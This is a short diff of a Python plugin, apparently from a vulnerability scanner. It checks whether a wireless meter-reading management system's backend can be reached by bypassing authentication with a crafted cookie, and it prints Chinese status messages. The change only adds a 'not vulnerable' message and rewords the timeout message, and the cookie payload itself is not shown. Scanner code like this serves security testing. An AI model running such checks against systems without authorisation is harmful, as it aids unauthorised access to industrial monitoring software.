@@ -27,9 +27,12 @@ class wireless_monitor_priv_elevation_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if "无线抄表监控管理系统" in req.text:
                 cprint("[+]存在新力热电无线抄表管理系统后台绕过...(高危)\tpayload: "+vulnurl+"\tpost: Cookie:"+json.dumps(headers["Cookie"]), "red")
+            else:
+                cprint("[-]不存在wireless_monitor_priv_elevation漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
